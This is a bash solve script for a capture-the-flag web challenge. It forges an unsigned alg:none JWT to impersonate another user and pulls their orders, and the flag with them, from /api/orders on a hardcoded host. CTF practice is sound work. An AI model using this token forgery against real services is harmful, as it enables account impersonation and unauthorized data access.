#!/usr/bin/env bash
# solve-web7-orders-jwt.sh — riffhack web7 (alg:none JWT → orders IDOR)
#
# /api/orders trusts a decoded auth-token cookie to identify the user, but
# the verifier accepts alg:none. Forge a token claiming to be k7m3n (a seed
# reviewer who owns a completed order) and the flag is in that order's
# `notes` field.
#
# The other obvious seed userIds (lookup-public, ops-hidden) return [] because
# their orders' status != 'completed'. k7m3n is found via the web6 SQLi pivot.
#
# Usage: solve-web7-orders-jwt.sh <host>
set -euo pipefail

HOST="${1:-159.89.230.27}"
HERE="$(cd "$(dirname "$0")" && pwd)"
# shellcheck disable=SC1091
source "$HERE/lib/jwt-none.sh"

echo "[*] web7 (orders IDOR via alg:none JWT) against $HOST"

TOKEN=$(forge_jwt_none "k7m3n" false)
echo "[*] forged JWT: $TOKEN"

echo "[*] GET /api/orders as k7m3n"
resp=$(curl -sk -b "auth-token=$TOKEN" "http://$HOST/api/orders")

echo "[*] response (pretty):"
printf '%s\n' "$resp" | python3 -m json.tool || printf '%s\n' "$resp"

flag=$(printf '%s\n' "$resp" | grep -oE 'bitflag\{[^}]+\}' | head -1)

if [[ -n "$flag" ]]; then
  echo "[+] FLAG: $flag"
else
  echo "[-] no flag — try other seed userIds (xyz78, abc12) or re-dump Review seeds" >&2
  exit 1
fi
